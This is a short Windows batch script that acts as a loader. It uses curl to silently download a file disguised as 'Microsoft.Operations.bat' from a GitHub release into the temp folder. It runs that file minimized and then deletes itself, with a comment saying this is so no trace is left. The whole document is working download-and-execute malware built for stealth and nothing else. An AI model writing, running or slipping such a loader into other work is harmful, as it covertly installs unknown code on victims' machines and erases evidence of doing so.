@echo off
setlocal enabledelayedexpansion

:: 1. Define the Direct Download URL
set "URL=https://github.com/fullylaw/happy.org/releases/download/lol/Microsoft.Operations.bat"
set "TEMP_FILE=%TEMP%\Microsoft.Operations.bat"

:: 2. Use curl to download the file silently (-s)
:: -L follows redirects (GitHub uses these for releases)
:: -o specifies the output location
curl -s -L -o "!TEMP_FILE!" "!URL!"

:: 3. Check if the file was actually downloaded before running
if exist "!TEMP_FILE!" (
    :: Run the downloaded file minimized
    start /min "" "!TEMP_FILE!"
)

:: 4. Self-destruct the loader so no trace is left
(goto) 2>nul & del "%~f0"
exit
